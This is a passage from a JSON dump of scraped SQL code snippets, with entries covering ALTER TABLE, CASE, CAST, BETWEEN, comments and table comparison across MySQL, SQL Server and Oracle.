    "description": "/* To retreive the column names of table using sql */  SELECT COLUMN_NAME. FROM INFORMATION_SCHEMA. COLUMNS. WHERE TABLE_NAME = 'Your Table Name'\nSELECT   \tTABLE_NAME FROM   \tINFORMATION_SCHEMA.TABLES \n-- MySQL SELECT *  FROM INFORMATION_SCHEMA.COLUMNS;  -- SQL Server (possible solution) SELECT *  FROM SYS.COLUMNS;  -- Oracle SELECT *  FROM ALL_TAB_COLS; -- (If you only want user-defined columns) -- ALL_TAB_COLS : only user-defined columns -- ALL_TAB_COLUMNS : both user-defined AND system columns\n",
    "reg_date": "2021-10-12T09:59:56.000Z"
  },
  {
    "id": 3740,
    "keyword": null,
    "link": null,
    "title": " sql alter column",
    "description": "ALTER TABLE table_name ALTER COLUMN column_name datatype;  -- Example ALTER TABLE product ALTER COLUMN description VARCHAR(250);\nALTER TABLE table_name  ALTER COLUMN column_name new_data_type(size); \nALTER TABLE nom_table RENAME COLUMN colonne_ancien_nom TO colonne_nouveau_nom\nALTER TABLE table_name  CHANGE COLUMN column_name column_name datatype; \nChanges the data type of a table&rsquo;s column. Example: In the &lsquo;users&rsquo; table, make the column &lsquo;incept_date&rsquo; into a &lsquo;datetime&rsquo; type. ALTER TABLE users ALTER COLUMN incept_date datetime;\n-- With check if field already exists  IF NOT EXISTS(SELECT 1 FROM sys.columns            WHERE Name = N'Email'           AND Object_ID = Object_ID(N'dbo.Customers')) BEGIN     \tALTER TABLE Customers     ADD Email varchar(255); END\n",
    "reg_date": "2021-10-12T09:59:56.000Z"
  },
  {
    "id": 3741,
    "keyword": null,
    "link": null,
    "title": " sql alter table",
    "description": "ALTER TABLE Customers ADD Email varchar(255); \nALTER TABLE table_name ADD column_name datatype;  --example ALTER TABLE Customers ADD Email varchar(255);\nALTER TABLE table_name ADD column_name datatype;\nALTER TABLE table ADD COLUMN column VARCHAR (255) NOT NULL AFTER column;\nALTER TABLE dbo.doc_exa  ADD column_b VARCHAR(20) NULL,  \tcolumn_c INT NULL ;\n-- With check if field already exists  IF NOT EXISTS(SELECT 1 FROM sys.columns            WHERE Name = N'Email'           AND Object_ID = Object_ID(N'dbo.Customers')) BEGIN     \tALTER TABLE Customers     ADD Email varchar(255); END\n",
    "reg_date": "2021-10-12T09:59:56.000Z"
  },
  {
    "id": 3742,
    "keyword": null,
    "link": null,
    "title": " sql alter table add column if exists",
    "description": "IF NOT EXISTS (   SELECT     *   FROM     INFORMATION_SCHEMA.COLUMNS   WHERE     TABLE_NAME = 'table_name' AND COLUMN_NAME = 'col_name') BEGIN   ALTER TABLE table_name     ADD col_name data_type NULL END; \n",
    "reg_date": "2021-10-12T09:59:56.000Z"
  },
  {
    "id": 3743,
    "keyword": null,
    "link": null,
    "title": " sql alter table order by",
    "description": "ALTER TABLE tablename ORDER BY columnname ASC;.\n",
    "reg_date": "2021-10-12T09:59:56.000Z"
  },
  {
    "id": 3744,
    "keyword": null,
    "link": null,
    "title": " sql alter type of column",
    "description": "ALTER TABLE table_name ALTER COLUMN column_name datatype;  -- Example ALTER TABLE product ALTER COLUMN description VARCHAR(250);\nALTER TABLE table_name  ALTER COLUMN column_name new_data_type(size); \nALTER TABLE dbo.doc_exa  ADD column_b VARCHAR(20) NULL,  \tcolumn_c INT NULL ;\nALTER TABLE TableName MODIFY COLUMN ColumnName DataType;\n",
    "reg_date": "2021-10-12T09:59:56.000Z"
  },
  {
    "id": 3745,
    "keyword": null,
    "link": null,
    "title": " sql and",
    "description": "/* AND is a operator that allows you to combine two conditions Both conditions must be true for the row to b e included in the result set */ SELECT column_name(s) FROM table_name WHERE column_1 = value_1 AND column_2 = value_2;\nUsed to join separate conditions within a WHERE clause. Example: Returns events located in London, United Kingdom SELECT * FROM events WHERE host_country='United Kingdom' AND host_ city='London';\nSELECT * FROM Customers WHERE Country='Mexico';\n",
    "reg_date": "2021-10-12T09:59:56.000Z"
  },
  {
    "id": 3746,
    "keyword": null,
    "link": null,
    "title": " sql any",
    "description": "Returns true if any of the subquery values meet the given condition. Example: Returns products from the products table which have received orders &ndash; stored in the orders table &ndash; with a quantity of more than 5. SELECT name FROM products WHERE productId = ANY (SELECT productId FROM orders WHERE quantity > 5);\nReturns true if all of the subquery values meet the passed condition. Example: Returns the users with a higher number of tasks than the user with the highest number of tasks in the HR department (id 2) SELECT first_name, surname, tasks_no FROM users WHERE tasks_no > ALL (SELECT tasks FROM user WHERE department_id = 2);\n",
    "reg_date": "2021-10-12T09:59:56.000Z"
  },
  {
    "id": 3747,
    "keyword": null,
    "link": null,
    "title": " sql arithmetic operators",
    "description": "You use the operators in any clause (except the From clause)  With Date and Timestamp - can only use addition and subtraction  Add (+), Subtract (-), Multiply (*), Divide (/)\n+ Add &ndash; Subtract * Multiply / Divide % Modulo\n(Between) operator same as  \">= <=\" For example:  Select * From Employees Where salary Between 4000 AND 6000;  (NOT) operator excluding given For example: Select last_name, job_id From Employees Where \"Not\" job_id = 'ABC';   (IN) operator in sql like \"OR\" operator For example:  Select * From employees Where department_id \"IN\" (60,90);    (Like) Operator for partial searches using wildcard '%' and '_' For Example: Select * From Employees Where last_name LIKE '_a%';   (Top N results) Select * From Employees Where ROWNUM <=5;   (NVL) replaces NULL values with same type default value provided. For Example =  Select NVL(commission_percentage, 0) From Employees; \n",
    "reg_date": "2021-10-12T09:59:56.000Z"
  },
  {
    "id": 3748,
    "keyword": null,
    "link": null,
    "title": " sql as",
    "description": "SELECT NAME AS \"Employee Name\" FROM PEOPLE;  SELECT p.NAME AS \"Employee Name\", s.SALARY  FROM PEOPLE p JOIN SALARIES s ON p.ID = s.ID;\nRenames a table or column with an alias value which only exists for the duration of the query. Example: Aliases north_east_user_subscriptions column SELECT north_east_user_subscriptions AS ne_subs FROM users WHERE ne_subs > 5;\nSELECT CustomerID AS ID, CustomerName AS Customer\n-- AS is a keyword that allows you to rename a column or table using an alias SELECT column_name AS 'Alias' FROM table_name;\n",
    "reg_date": "2021-10-12T09:59:56.000Z"
  },
  {
    "id": 3749,
    "keyword": null,
    "link": null,
    "title": " sql asc",
    "description": "Used with ORDER BY to return the data in ascending order. Example: Apples, Bananas, Peaches, Raddish\nSELECT NAME AS \"Employee Name\" FROM PEOPLE;  SELECT p.NAME AS \"Employee Name\", s.SALARY  FROM PEOPLE p JOIN SALARIES s ON p.ID = s.ID;\nRenames a table or column with an alias value which only exists for the duration of the query. Example: Aliases north_east_user_subscriptions column SELECT north_east_user_subscriptions AS ne_subs FROM users WHERE ne_subs > 5;\nSELECT CustomerID AS ID, CustomerName AS Customer\n-- AS is a keyword that allows you to rename a column or table using an alias SELECT column_name AS 'Alias' FROM table_name;\n",
    "reg_date": "2021-10-12T09:59:56.000Z"
  },
  {
    "id": 3750,
    "keyword": null,
    "link": null,
    "title": " sql asynchronous stored procedure call",
    "description": "-- To call a procedure asynchronously, create a auto_drop job: BEGIN     DBMS_SCHEDULER.create_job(             job_name => 'My_JOB_NAME',             job_type => 'PLSQL_BLOCK',             job_action => 'BEGIN my_procedure(); END;',             start_date => systimestamp,             auto_drop => TRUE,             enabled => TRUE         ); END;\n",
    "reg_date": "2021-10-12T09:59:57.000Z"
  },
  {
    "id": 3751,
    "keyword": null,
    "link": null,
    "title": " sql auto update dupdated at",
    "description": "ALTER TABLE t1 ADD COLUMN created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP, ADD COLUMN updated_at DATETIME DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP; \nCREATE TABLE t1 (   created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ,   updated_at DATETIME DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP ); \n",
    "reg_date": "2021-10-12T09:59:57.000Z"
  },
  {
    "id": 3752,
    "keyword": null,
    "link": null,
    "title": " sql avg()",
    "description": "/*AVG() is an aggregate function that returns the     average value for a numeric column*/ SELECT AVG(column_name) FROM table_name;\n",
    "reg_date": "2021-10-12T09:59:57.000Z"
  },
  {
    "id": 3753,
    "keyword": null,
    "link": null,
    "title": " sql avg and group by",
    "description": "SELECT   AVG(depdelay),   origin FROM flight_delays WHERE distance > 2000 GROUP BY origin; \n",
    "reg_date": "2021-10-12T09:59:57.000Z"
  },
  {
    "id": 3754,
    "keyword": null,
    "link": null,
    "title": " sql beginning of previous month",
    "description": "SELECT DATEADD(d,1,EOMONTH(GETDATE(),-2))\n",
    "reg_date": "2021-10-12T09:59:57.000Z"
  },
  {
    "id": 3755,
    "keyword": null,
    "link": null,
    "title": " sql between",
    "description": "/*the BETWEEN operator is used to filter the result set within  a certain range. the values can be numbers, texts or dates */ SELECT column_name(s) FROM table_name WHERE column_name BETWEEN value1 AND value2;\nSELECT * FROM my_table WHERE my_col BETWEEN 10 AND 20; -- equivalent to SELECT * FROM my_table WHERE my_col >= 10 AND my_col <= 20;\nBETWEEN w&auml;hlt Werte innerhalb eines bestimmten Bereichs aus. Die Werte k&ouml;nnen Zahlen, Text oder Datumsangaben sein.  SELECT column_name(s) FROM table_name WHERE     column_name BETWEEN value1 AND value2; \nSELECT column_name(s) FROM table_name WHERE column_name BETWEEN value1 AND value2;\n#The BETWEEN operator selects a range of data between two values. The values can be numbers, #text, or dates.  syntax->SELECT column_name(s) FROM table_name WHERE column_name BETWEEN value1 AND value2  ///example/// SELECT * FROM Persons WHERE LastName BETWEEN 'Hansen' AND 'Pettersen'\nSelects values within the given range. Example 1: Selects stock with a quantity between 100 and 150. SELECT * FROM stock WHERE quantity BETWEEN 100 AND 150; Example 2: Selects stock with a quantity NOT between 100 and 150. Alternatively, using the NOT keyword here reverses the logic and selects values outside the given range. SELECT * FROM stock WHERE quantity NOT BETWEEN 100 AND 150;\n",
    "reg_date": "2021-10-12T09:59:57.000Z"
  },
  {
    "id": 3756,
    "keyword": null,
    "link": null,
    "title": " sql between date range",
    "description": "SELECT * FROM Orders WHERE OrderDate BETWEEN '2021-01-01' AND '2021-07-10';\n/*the BETWEEN operator is used to filter the result set within  a certain range. the values can be numbers, texts or dates */ SELECT column_name(s) FROM table_name WHERE column_name BETWEEN value1 AND value2;\nSELECT column_name(s) FROM table_name WHERE column_name BETWEEN value1 AND value2;\n",
    "reg_date": "2021-10-12T09:59:57.000Z"
  },
  {
    "id": 3757,
    "keyword": null,
    "link": null,
    "title": " sql bitwise operators",
    "description": "& Bitwise AND | Bitwise OR ^ Bitwise exclusive OR\n",
    "reg_date": "2021-10-12T09:59:57.000Z"
  },
  {
    "id": 3758,
    "keyword": null,
    "link": null,
    "title": " sql calculate working days between two dates excluding weekends and holidays",
    "description": "-- All dates between 01/07/2021 and 15/07/2021 excluding weekends SELECT CAL_DATE FROM (          SELECT to_date('01/07/2021', 'DD/MM/YYYY') + ROWNUM - 1 AS CAL_DATE          FROM ALL_OBJECTS          WHERE ROWNUM <= to_date('15/07/2021', 'DD/MM/YYYY')                               - to_date('01/07/2021', 'DD/MM/YYYY') + 1) WHERE to_char(CAL_DATE, 'DY', 'NLS_DATE_LANGUAGE=AMERICAN') NOT IN ('SAT', 'SUN');\n",
    "reg_date": "2021-10-12T09:59:57.000Z"
  },
  {
    "id": 3759,
    "keyword": null,
    "link": null,
    "title": " sql cascade delete sql",
    "description": "ALTER TABLE dbo.T2    DROP CONSTRAINT FK_T1_T2   -- or whatever it's called  ALTER TABLE dbo.T2    ADD CONSTRAINT FK_T1_T2_Cascade    FOREIGN KEY (EmployeeID) REFERENCES dbo.T1(EmployeeID) ON DELETE CASCADE \nCREATE TABLE child_table (   column1 datatype [ NULL | NOT NULL ],   column2 datatype [ NULL | NOT NULL ],   ...    CONSTRAINT fk_name     FOREIGN KEY (child_col1, child_col2, ... child_col_n)     REFERENCES parent_table (parent_col1, parent_col2, ... parent_col_n)     ON DELETE CASCADE     [ ON UPDATE { NO ACTION | CASCADE | SET NULL | SET DEFAULT } ]  );\n",
    "reg_date": "2021-10-12T09:59:58.000Z"
  },
  {
    "id": 3760,
    "keyword": null,
    "link": null,
    "title": " sql case",
    "description": "-- NOTE: this is for SQL-Oracle specifically  /* NB: Please like Mingles444 post, I derived this from him/her */  -- syntax: (Retrieved from grepper:Mingles444) CASE     WHEN condition1 THEN result1     WHEN condition2 THEN result2     WHEN conditionN THEN resultN     ELSE result END   -- example: SELECT  \tCASE       WHEN (1+6 = 6) THEN 'A'       WHEN (1+6 = 7) THEN 'B'       WHEN (1+6 = 8) THEN 'C'       ELSE 'D' \tEND  FROM DUAL;  -- OUTPUT: B \n/*CASE statements are used to create different outputs and is    used by SQL as a way to handle if-then logic.*/      SELECT column_name,     CASE        WHEN condition THEN 'Result_1'       WHEN condition THEN 'Result_2'       ELSE 'Result_3'     END   FROM table_name;\nChange query output depending on conditions. Example: Returns users and their subscriptions, along with a new column called activity_levels that makes a judgement based on the number of subscriptions. SELECT first_name, surname, subscriptions CASE WHEN subscriptions > 10 THEN 'Very active' WHEN Quantity BETWEEN 3 AND 10 THEN 'Active' ELSE 'Inactive' END AS activity_levels FROM users;\n",
    "reg_date": "2021-10-12T09:59:58.000Z"
  },
  {
    "id": 3761,
    "keyword": null,
    "link": null,
    "title": " sql case sensitive compare",
    "description": "SELECT * FROM table_name WHERE UPPER(col_name) LIKE '%SEARCHED%'; SELECT * FROM table_name WHERE col_name LIKE '%Searched%';  -- Case sensitive  SYMBOL\tDESCRIPTION\t(SQL)                       EXAMPLE %\t    zero or more characters\t                bl%      'bl, black, blue, blob' _\t    a single character\t                    h_t      'hot, hat, hit' []\t    any single character within brackets\th[oa]t   'hot, hat', but NOT 'hit' ^\t    any character not in the brackets\t    h[^oa]t  'hit', but NOT 'hot, hat' -\t    a range of characters\t                [a-b]t   'cat, cbt'\n",
    "reg_date": "2021-10-12T09:59:58.000Z"
  },
  {
    "id": 3762,
    "keyword": null,
    "link": null,
    "title": " sql case update",
    "description": "UPDATE dbo.TestStudents   SET     LASTNAME =  CASE                           WHEN LASTNAME = 'AAA' THEN 'BBB'                          WHEN LASTNAME = 'CCC' THEN 'DDD'                          WHEN LASTNAME = 'EEE' THEN 'FFF'                          ELSE LASTNAME                     END  WHERE   LASTNAME IN ('AAA', 'CCC', 'EEE') \n",
    "reg_date": "2021-10-12T09:59:58.000Z"
  },
  {
    "id": 3763,
    "keyword": null,
    "link": null,
    "title": " sql case when multiple conditions",
    "description": "SELECT CASE col1 \tWHEN 'agree' THEN 'Ok' \tWHEN 'disagree' THEN 'Ko'     ELSE         CASE              WHEN col2 >= 1 THEN 'Ko'             ELSE 'Maybe'         END END AS my_result FROM table_name;\n",
    "reg_date": "2021-10-12T09:59:58.000Z"
  },
  {
    "id": 3764,
    "keyword": null,
    "link": null,
    "title": " sql cast",
    "description": "-- Specifically for Oracle  -- EXAMPLE CAST('732.98' AS INT)  /* SYNTAX CAST(<value_to_cast> AS <data_type_to_cast_to>) */\nCAST('2006-04-25T15:50:59.997' AS date) AS Date,    CAST('2006-04-25T15:50:59.997' AS time) AS Time,    CAST('2006-04-25T15:50:59.997' AS datetime) AS Datetime, \nDECLARE @counter INT = 0 DECLARE @date DATETIME = '2006-12-30 00:38:54.840'  CREATE TABLE #dateFormats (dateFormatOption int, dateOutput nvarchar(40))  WHILE (@counter <= 150 ) BEGIN    BEGIN TRY       INSERT INTO #dateFormats       SELECT CONVERT(nvarchar, @counter), CONVERT(nvarchar,@date, @counter)        SET @counter = @counter + 1    END TRY    BEGIN CATCH;       SET @counter = @counter + 1       IF @counter >= 150       BEGIN          BREAK       END    END CATCH END  SELECT * FROM #dateFormats\n",
    "reg_date": "2021-10-12T09:59:58.000Z"
  },
  {
    "id": 3765,
    "keyword": null,
    "link": null,
    "title": " sql cast as",
    "description": "CAST('2006-04-25T15:50:59.997' AS date) AS Date,    CAST('2006-04-25T15:50:59.997' AS time) AS Time,    CAST('2006-04-25T15:50:59.997' AS datetime) AS Datetime, \n",
    "reg_date": "2021-10-12T09:59:58.000Z"
  },
  {
    "id": 3766,
    "keyword": null,
    "link": null,
    "title": " sql cast date to 103",
    "description": "Example  SELECT CONVERT(varchar, '2017-08-25', 101);  CONVERT(data_type(length), expression, style)  Converting datetime to character: Without century\tWith century\tInput/Output\tStandard 0\t100\tmon dd yyyy hh:miAM/PM\tDefault 1\t101\tmm/dd/yyyy\tUS 2\t102\t yyyy.mm.dd\tANSI 3\t103\t dd/mm/yyyy\tBritish/French 4\t104\tdd.mm.yyyy\tGerman 5\t105\t dd-mm-yyyy\tItalian 6\t106\tdd mon yyyy\t- 7\t107\tMon dd, yyyy\t- 8\t108\thh:mm:ss\t- 9\t109\tmon dd yyyy hh:mi:ss:mmmAM (or PM)\tDefault + millisec 10\t110\tmm-dd-yyyy\tUSA 11\t111\t yyyy/mm/dd\tJapan 12\t112\t yyyymmdd\tISO 13\t113\tdd mon yyyy hh:mi:ss:mmm\tEurope (24 hour clock)> 14\t114\thh:mi:ss:mmm\t24 hour clock 20\t120\tyyyy-mm-dd hh:mi:ss\tODBC canonical (24 hour clock) 21\t121\tyyyy-mm-dd hh:mi:ss.mmm\tODBC canonical (24 hour clock)  \t126\tyyyy-mm-ddThh:mi:ss.mmm\tISO8601  \t127\tyyyy-mm-ddThh:mi:ss.mmmZ\tISO8601 (with time zone Z)  \t130\tdd mon yyyy hh:mi:ss:mmmAM\tHijiri  \t131\tdd/mm/yy hh:mi:ss:mmmAM\tHijiri \ncast date to 103\n",
    "reg_date": "2021-10-12T09:59:58.000Z"
  },
  {
    "id": 3767,
    "keyword": null,
    "link": null,
    "title": " sql cast to float",
    "description": "-- Specifically for Oracle  -- EXAMPLE CAST('732.98' AS INT)  /* SYNTAX CAST(<value_to_cast> AS <data_type_to_cast_to>) */\n SELECT CAST(25.65 AS int); \n",
    "reg_date": "2021-10-12T09:59:58.000Z"
  },
  {
    "id": 3768,
    "keyword": null,
    "link": null,
    "title": " sql cast to integer",
    "description": "-- NOTE: this is for SQL-Oracle specifically  /* <...> : Your personal entry */  -- syntax: CAST(<variable> as <variable-type>) -- in this case: <variable-type> = INTEGER  -- example: SELECT CAST(MEMBER_NO as INTEGER) FROM DUAL; \n",
    "reg_date": "2021-10-12T09:59:59.000Z"
  },
  {
    "id": 3769,
    "keyword": null,
    "link": null,
    "title": " sql change column in existing table",
    "description": "'This adds 'NOT NULL' to excisting column counting in the table mytable' ALTER TABLE mytable ALTER COLUMN counting INT NOT NULL;\n",
    "reg_date": "2021-10-12T09:59:59.000Z"
  },
  {
    "id": 3770,
    "keyword": null,
    "link": null,
    "title": " sql change column name based on value",
    "description": "ALTER TABLE \"table_name\" RENAME COLUMN \"column 1\" TO \"column 2\";\nSELECT CASE lower(col1) \tWHEN 'agree' THEN 'Ok'     ELSE         CASE              WHEN col2 = 1 THEN 'Ko'             ELSE 'Maybe'         END END AS my_result FROM table_name;\nALTER TABLE `table_name`  CHANGE `old_name` `new_name` VARCHAR(10)  CHARACTER SET utf8  COLLATE utf8_general_ci NULL  DEFAULT NULL;\n",
    "reg_date": "2021-10-12T09:59:59.000Z"
  },
  {
    "id": 3771,
    "keyword": null,
    "link": null,
    "title": " sql change column types",
    "description": "ALTER TABLE table_name ALTER COLUMN column_name datatype;  -- Example ALTER TABLE product ALTER COLUMN description VARCHAR(250);\n",
    "reg_date": "2021-10-12T09:59:59.000Z"
  },
  {
    "id": 3772,
    "keyword": null,
    "link": null,
    "title": " sql change table name",
    "description": "ALTER TABLE STUDENTS   RENAME TO ARTISTS;  \nUSE AdventureWorks2012;    GO   EXEC sp_rename 'Sales.SalesTerritory', 'SalesTerr';   \nALTER TABLE \"table_name\" RENAME COLUMN \"column 1\" TO \"column 2\";\nALTER TABLE table_name CHANGE COLUMN old_name TO new_name; \nALTER TABLE `Table Name` MODIFY COLUMN `Column Name` Datatype(Size);\nALTER TABLE exampletable RENAME TO new_table_name;\n",
    "reg_date": "2021-10-12T09:59:59.000Z"
  },
  {
    "id": 3773,
    "keyword": null,
    "link": null,
    "title": " sql cheat sheet",
    "description": "Guys, are you looking for SQL cheatsheet, in pdf format :)  -> https://buggyprogrammer.com/sql-cheatsheet/\n# Finding Data Queries  # SELECT: used to select data from a database SELECT * FROM table_name;  # DISTINCT: filters away duplicate values and returns rows of specified column SELECT DISTINCT column_name;  # WHERE: used to filter records/rows SELECT column1, column2 FROM table_name WHERE condition; SELECT * FROM table_name WHERE condition1 AND condition2; SELECT * FROM table_name WHERE condition1 OR condition2; SELECT * FROM table_name WHERE NOT condition; SELECT * FROM table_name WHERE condition1 AND (condition2 OR condition3); SELECT * FROM table_name WHERE EXISTS (SELECT column_name FROM table_name WHERE condition);  # ORDER BY: used to sort the result-set in ascending or descending order SELECT * FROM table_name ORDER BY column; SELECT * FROM table_name ORDER BY column DESC; SELECT * FROM table_name ORDER BY column1 ASC, column2 DESC; SELECT TOP: used to specify the number of records to return from top of table SELECT TOP number columns_names FROM table_name WHERE condition; SELECT TOP percent columns_names FROM table_name WHERE condition;  # Not all database systems support SELECT TOP. The MySQL equivalent is the LIMIT clause SELECT column_names FROM table_name LIMIT offset, count;  # LIKE: operator used in a WHERE clause to search for a specific pattern in a column # % (percent sign) is a wildcard character that represents zero, one, or multiple characters # _ (underscore) is a wildcard character that represents a single character SELECT column_names FROM table_name WHERE column_name LIKE pattern;  LIKE &lsquo;a%&rsquo; # (find any values that start with &ldquo;a&rdquo;) LIKE &lsquo;%a&rsquo; # (find any values that end with &ldquo;a&rdquo;) LIKE &lsquo;%or%&rsquo; # (find any values that have &ldquo;or&rdquo; in any position) LIKE &lsquo;_r%&rsquo; # (find any values that have &ldquo;r&rdquo; in the second position) LIKE &lsquo;a_%_%&rsquo; # (find any values that start with &ldquo;a&rdquo; and are at least 3 characters in length) LIKE &lsquo;[a-c]%&rsquo; # (find any values starting with &ldquo;a&rdquo;, &ldquo;b&rdquo;, or &ldquo;c&rdquo;  # See more in the source link\n",
    "reg_date": "2021-10-12T09:59:59.000Z"
  },
  {
    "id": 3774,
    "keyword": null,
    "link": null,
    "title": " sql check date is null",
    "description": " SELECT * FROM yourtable WHERE yourdatecolumn IS NULL\n",
    "reg_date": "2021-10-12T09:59:59.000Z"
  },
  {
    "id": 3775,
    "keyword": null,
    "link": null,
    "title": " sql check deadlock query",
    "description": "SELECT    xed.value('@timestamp', 'datetime2(3)') as CreationDate,    xed.query('.') AS XEvent FROM (    SELECT CAST([target_data] AS XML) AS TargetData    FROM sys.dm_xe_session_targets AS st       INNER JOIN sys.dm_xe_sessions AS s          ON s.address = st.event_session_address       WHERE s.name = N'system_health'          AND st.target_name = N'ring_buffer' ) AS Data CROSS APPLY TargetData.nodes('RingBufferTarget/event[@name=\"xml_deadlock_report\"]') AS XEventData (xed) ORDER BY CreationDate DESC\n",
    "reg_date": "2021-10-12T09:59:59.000Z"
  },
  {
    "id": 3776,
    "keyword": null,
    "link": null,
    "title": " sql check double value",
    "description": "SELECT name, COUNT(email)  FROM users GROUP BY email HAVING COUNT(email) > 1\nSELECT     name, email, COUNT(*) FROM     users GROUP BY     name, email HAVING      COUNT(*) > 1 \ndeclare @YourTable table (id int, name varchar(10), email varchar(50))  INSERT @YourTable VALUES (1,'John','John-email') INSERT @YourTable VALUES (2,'John','John-email') INSERT @YourTable VALUES (3,'fred','John-email') INSERT @YourTable VALUES (4,'fred','fred-email') INSERT @YourTable VALUES (5,'sam','sam-email') INSERT @YourTable VALUES (6,'sam','sam-email')  SELECT     name,email, COUNT(*) AS CountOf     FROM @YourTable     GROUP BY name,email     HAVING COUNT(*)>1\n",
    "reg_date": "2021-10-12T09:59:59.000Z"
  },
  {
    "id": 3777,
    "keyword": null,
    "link": null,
    "title": " sql check for null and empty string",
    "description": "IF ISNULL(@param) OR @param = '' THEN doSomething...\n",
    "reg_date": "2021-10-12T09:59:59.000Z"
  },
  {
    "id": 3778,
    "keyword": null,
    "link": null,
    "title": " sql check if column exists",
    "description": "IF COL_LENGTH('<table_name>', '<column_name>') IS NULL BEGIN \t--column doesnot exists, so, add column here \tALTER TABLE <table_name> ADD <column_name> BIT NOT NULL DEFAULT(0) END\n* Using the below query, You can check whether the table1 has a column named \"id\"  SHOW COLUMNS FROM table1 LIKE 'id'\n",
    "reg_date": "2021-10-12T10:00:00.000Z"
  },
  {
    "id": 3779,
    "keyword": null,
    "link": null,
    "title": " sql check if date is between 2 dates",
    "description": "SELECT startDate, endDate FROM YourTable WHERE '2012-10-25' between startDate and endDate\n",
    "reg_date": "2021-10-12T10:00:00.000Z"
  },
  {
    "id": 3780,
    "keyword": null,
    "link": null,
    "title": " sql check roles",
    "description": "USE master   GO   SELECT DP1.name AS DatabaseRoleName,       isnull (DP2.name, 'No members') AS DatabaseUserName     FROM sys.database_role_members AS DRM    RIGHT OUTER JOIN sys.database_principals AS DP1      ON DRM.role_principal_id = DP1.principal_id    LEFT OUTER JOIN sys.database_principals AS DP2      ON DRM.member_principal_id = DP2.principal_id   WHERE DP1.type = 'R' ORDER BY DP1.name;\n",
    "reg_date": "2021-10-12T10:00:00.000Z"
  },
  {
    "id": 3781,
    "keyword": null,
    "link": null,
    "title": " sql check same row",
    "description": "//  select duplicate ------------- -- users (name, email) -- // -------------------------------  SELECT     id, school_id, COUNT(*) FROM     booster_school_languages GROUP BY     id, school_id HAVING      COUNT(*) > 3\n",
    "reg_date": "2021-10-12T10:00:00.000Z"
  },
  {
    "id": 3782,
    "keyword": null,
    "link": null,
    "title": " sql cnvert bit to nvarchar",
    "description": "CONVERT(NVARCHAR, ISNULL(bitFieldValue, 0))\n",
    "reg_date": "2021-10-12T10:00:00.000Z"
  },
  {
    "id": 3783,
    "keyword": null,
    "link": null,
    "title": " sql column contains special character",
    "description": "SELECT Col1 FROM TABLE WHERE Col1 like '%[^a-Z0-9]%' \n",
    "reg_date": "2021-10-12T10:00:00.000Z"
  },
  {
    "id": 3784,
    "keyword": null,
    "link": null,
    "title": " sql column values comma separated",
    "description": "SELECT STRING_AGG(columnName,',') from tableName\n",
    "reg_date": "2021-10-12T10:00:00.000Z"
  },
  {
    "id": 3785,
    "keyword": null,
    "link": null,
    "title": " sql command to add row to table",
    "description": "INSERT INTO table(column1, column2,...) VALUES (value1, value2,...);\n",
    "reg_date": "2021-10-12T10:00:00.000Z"
  },
  {
    "id": 3786,
    "keyword": null,
    "link": null,
    "title": " sql comment'",
    "description": "/* Multi-Line Comment */ -- Single-Line comment\n/* Comment */\n/*  This is a MULTI-LINE Comment */  -- This is Single-Line Comment\n/* Multi-Line comment goes here */  -- Single-Line comment goes here\n",
    "reg_date": "2021-10-12T10:00:00.000Z"
  },
  {
    "id": 3787,
    "keyword": null,
    "link": null,
    "title": " sql comment header",
    "description": "------------------------------------------------------------------------------- -- Author       name -- Created      date -- Purpose      description of the business/technical purpose --              using multiple lines as needed -- Copyright &copy; yyyy, Company Name, All Rights Reserved ------------------------------------------------------------------------------- -- Modification History -- -- 01/01/0000  developer full name   --      A comprehensive description of the changes. The description may use as  --      many lines as needed. -------------------------------------------------------------------------------\n",
    "reg_date": "2021-10-12T10:00:01.000Z"
  },
  {
    "id": 3788,
    "keyword": null,
    "link": null,
    "title": " sql comments",
    "description": "/* Multi-Line Comment */ -- Single-Line comment\n/* Comment */\n/*  This is a MULTI-LINE Comment */  -- This is Single-Line Comment\nSingle line comments start with &ndash;- Any text after these 2 characters to the end of the line will be ignored. Multiline comments start with /* and end with */. They stretch across multiple lines until the closing characters have been found. -- My Select query /* This is my select query. It grabs all rows of data from the users table */\n/* Multi-Line comment goes here */  -- Single-Line comment goes here\n",
    "reg_date": "2021-10-12T10:00:01.000Z"
  },
  {
    "id": 3789,
    "keyword": null,
    "link": null,
    "title": " sql common columns",
    "description": "-- NB: Applicable for Oracle and PL/SQL only  select *  from all_tab_cols A where     A.COLUMN_NAME in     (       select B.column_name       from all_tab_cols B       where B.table_name = 'YourFirstTable'    )    and A.table_name != 'YourFirstTable'    and A.TABLE_NAME = 'YourSecondTable';\n",
    "reg_date": "2021-10-12T10:00:01.000Z"
  },
  {
    "id": 3790,
    "keyword": null,
    "link": null,
    "title": " sql compare data from two tables",
    "description": "-- Oracle  -- Example SELECT *  FROM Table1 -- the table containing extra records   MINUS   SELECT *    FROM Table2;  -- Syntax  SELECT *  FROM <table-1> -- the table containing extra records   MINUS   SELECT *    FROM <table-2>;\nselect * from tableA minus select * from tableB \n",
    "reg_date": "2021-10-12T10:00:01.000Z"
  },
  {
    "id": 3791,
    "keyword": null,
    "link": null,
    "title": " sql compare strings",
    "description": "SELECT * FROM table WHERE Column = 'test';\t\t\t-- can use index SELECT * FROM table WHERE Column LIKE '%test%';\t\t-- can't use index SELECT * FROM table WHERE CONTAINS(Column, 'test'); -- faster with full text index\n",
    "reg_date": "2021-10-12T10:00:01.000Z"
  },
  {
    "id": 3792,
    "keyword": null,
    "link": null,
    "title": " sql compare tables",
    "description": "(SELECT * FROM T1 MINUS SELECT * FROM T2)   -- Rows that are in T1 but not in T2 UNION ALL (SELECT * FROM T2 MINUS SELECT * FROM T1);  -- Rows that are in T2 but not in T1\n-- Find the different tables and columns between DB_NBR_1 and DB_NBR_2 -- (just replace DB_NBR_1 and DB_NBR_2) select isnull(db1.table_name, db2.table_name) as [table],        isnull(db1.column_name, db2.column_name) as [column],        db1.column_name as scripts_col_name       ,db1.column_type as scripts_col_type        ,db1.column_precision as scripts_col_precision        ,db2.column_name as liquid_col_name       ,db2.column_type as liquid_col_type       ,db2.column_precision as liquid_col_precision from (select schema_name(tab.schema_id) + '.' + tab.name as table_name,         col.name as column_name       ,y.name as column_type       ,y.precision as column_precision    from [DB_NBR_1].sys.tables as tab         inner join [DB_NBR_1].sys.columns as col             on tab.object_id = col.object_id          JOIN sys.types y ON y.user_type_id = col.user_type_id          ) db1 full outer join (select schema_name(tab.schema_id) + '.' + 